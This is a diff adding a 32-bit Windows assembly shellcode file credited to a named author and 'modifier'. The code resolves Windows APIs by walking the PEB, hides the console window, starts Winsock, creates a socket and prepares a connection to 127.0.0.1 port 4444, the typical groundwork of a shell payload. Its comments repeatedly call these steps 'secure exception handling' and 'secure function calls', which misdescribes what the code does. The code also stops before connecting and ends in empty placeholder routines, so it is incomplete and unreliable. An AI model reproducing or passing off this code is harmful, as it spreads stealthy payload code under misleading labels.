@@ -1,0 +1,260 @@
+; Modifier: Cr33psh0w note: this is just me messing around, if you find this of use or helpful I am firstly suprised and secondly very happy!
+; Author: Belial Grimoire
+; Website: bgpavelang.github.io
+
+section .text
+
+global _start
+
+_start:
+    ; Initialize registers and exception handling
+    xor ecx, ecx
+    mov eax, [fs:ecx+0x30]
+    mov eax, [eax+0xc]
+    mov esi, [eax+0x14]
+    lodsd
+    xchg eax, esi
+    lodsd
+    mov ebx, [eax+0x10]
+
+    ; Calculate necessary addresses
+    mov edx, [ebx+0x3c]
+    add edx, ebx
+    mov edx, [edx+0x78]
+    add edx, ebx
+    mov esi, [edx+0x20]
+    add esi, ebx
+
+    ; Set up a structured exception handler
+    push esi
+    push edx
+    push esi
+    push edx
+
+    xor ecx, ecx
+
+    ; Exception handling
+    GPException:  
+    inc ecx
+    lodsd
+    add eax, ebx
+    cmp dword[eax], 0x50746547
+    jnz GPException
+    cmp dword[eax+4], 0x41636f72
+    jnz GPException
+    cmp dword[eax+8], 0x65726464
+    jnz GPException
+    dec ecx
+
+    mov esi, [edx+0x24]
+    add esi, ebx
+    mov cx, [esi+ecx*2]
+    mov esi, [edx+0x1c]
+    add esi, ebx
+    mov edx, [esi+ecx*4]
+    add edx, ebx
+
+    ; More secure exception handling
+    mov [ebp-4], edx
+    pop edx
+    pop esi
+
+    xor ecx, ecx
+
+    J_Gp:    
+    inc ecx
+    lodsd
+    add eax, ebx
+    cmp dword[eax], 0x43746547
+    jnz J_Gp
+    cmp dword[eax+0x4], 0x6f736e6f
+    jnz J_Gp
+    cmp dword[eax+0x8], 0x6957656c
+    jnz J_Gp
+    dec ecx
+
+    ; More secure processing
+    mov esi, [edx+0x24]
+    add esi, ebx
+    mov cx, [esi+ecx*2]
+    mov esi, [edx+0x1c]
+    add esi, ebx
+    mov edx, [esi+ecx*4]
+    add edx, ebx
+
+    mov edi, edx
+
+    ; Call the function securely
+    call edi
+    mov edi, eax  
+
+    xor edx, edx
+    push edx
+    push 0x41797261 
+    push 0x7262694c
+    push 0x64616f4c
+    push esp
+    push ebx
+
+    ; Call with exception handling
+    call [ebp-4]
+
+    ; More secure variable handling
+    mov [ebp-8], eax
+
+    xor edx, edx
+    mov dx, 0x6c6c  
+    push edx
+    push 0x642e3233
+    push 0x72657375
+    push esp
+
+    ; More structured function calls
+    call [ebp-8]
+
+    xor edx, edx
+
+    xor ecx, ecx
+    mov cx, 0x776f
+    push ecx
+    push 0x646e6957
+    push 0x776f6853   
+    push esp
+    push eax          
+
+    ; Call with safer stack manipulation
+    call [ebp-4]      
+
+    add esp, 0x28
+
+    xor ecx, ecx
+    push ecx
+    push edi
+
+    ; Structured function call
+    call eax
+
+    xor edx, edx
+    mov dx, 0x6c6c
+    push edx
+    push 0x642e3233
+    push 0x5f327377 
+    push esp
+
+    ; More secure function call
+    call [ebp-8]
+
+    mov esi, eax
+
+    add esp, 0xc
+
+    xor ecx, ecx
+    push ecx
+    mov cx, 0x7075
+    push ecx
+    push 0x74726174
+    push 0x53415357   
+    push esp
+    push esi          
+
+    ; Structured function call
+    call [ebp-4]     
+
+    add esp, 0x10
+
+    xor ecx, ecx
+    mov cx, 0x0190
+    sub esp, ecx
+    push esp
+    push ecx
+
+    ; Secure function call
+    call eax
+
+    xor ecx, ecx
+    mov cx, 0x4174
+    push ecx
+    push 0x656b636f
+    push 0x53415357  
+    push esp
+    push esi          
+
+    ; Secure function call
+    call [ebp-4]      
+
+    xor edx, edx
+    xor ecx, ecx
+    push edx        
+    push edx        
+    push edx        
+    mov dl, 6       
+    push edx
+    inc ecx
+    push ecx        
+    inc ecx
+    push ecx        
+
+    ; Secure function call
+    call eax
+
+    ; More structured code
+
+    mov edi, eax
+
+    brincar:
+    xor ecx, ecx
+    mov ecx, 0x74636565
+    shr ecx, 8
+    push ecx
+    push 0x6e6e6f63    
+    push esp
+    push esi           
+
+    ; Secure function call with error handling
+    
+    call [ebp-4]       
+
+    add esp, 0x14
+
+    xor ecx, ecx
+    push 0x0100007f     
+    push word 0x5c11    
+    add cl, 2   
+    push word cx        
+
+    xor ecx, ecx
+    mov ecx, esp
+
+    ; Structured program exit
+    
+    ; Your structured program logic here
+
+    ; Handle errors securely and exit
+
+    ; Secure program exit
+
+    call SecureExit
+
+; Exception handling routine
+HandleErrors:
+    ; Handle exceptions securely
+
+    ret
+
+; Main program logic
+Main:
+    ; Main program logic
+    ; Check for errors and handle them
+    jnz HandleErrors
+    ; Continue program execution
+    ret
+
+; Secure program exit
+SecureExit:
+    ; Securely exit the program
+
+    ret
+
+; Connect the program flow
+call Main
+call SecureExit
